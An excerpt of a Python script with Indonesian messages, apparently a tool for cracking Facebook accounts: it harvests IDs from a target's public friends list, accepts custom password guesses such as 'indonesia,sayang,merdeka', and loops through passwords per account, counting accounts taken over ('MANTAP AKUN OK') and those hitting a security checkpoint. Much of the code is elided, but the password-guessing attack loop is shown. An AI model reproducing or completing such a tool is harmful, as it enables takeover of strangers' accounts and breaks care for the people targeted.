...
def menu(my_name,my_id):
	...
	io = '''[bold red][01] CRACK PERTEMANAN PUBLIK'''
	oi = nel(io, style='red')
	...
	if ec in ['1','01']:
		...
		print(x+'['+h+'•'+x+'] TUNGGU SEDANG PROSES • • •')
		time.sleep(1)
		sw = '# SUCCESS OUT'
...
def setting():
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		krek = '[•] GUNAKAN KOMA UNTUK PEMISAH\n[•] GUNAKAN HURUF KECIL\n[•] CONTOH: indonesia,sayang,merdeka'
...
def passwrd():
	...
	krek = '[•] BERDOA TERLEBIH DAHULU AGAR DAPET AKUN OK :V%s\n[•] CRACK SEDANG DIMULAI HARAP SABAR MENUNGGU%s\n[•]MAINKAN MODE PESAWAT JIKA  TIDAK ADA HASIL'%(okc,cpc)
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	print('\r [%s●\33[m] %s/%s CRACK SEDANG BERJALAN • • •:[%s] %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='KURANG BERUNTUNG'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='MANTAP AKUN OK'))
					ok+=1
					break
					...
					cetak(nel(statusok1, title='[bold green]MANTAP AKUN OK[/bold green]'))
					ok+=1
					break
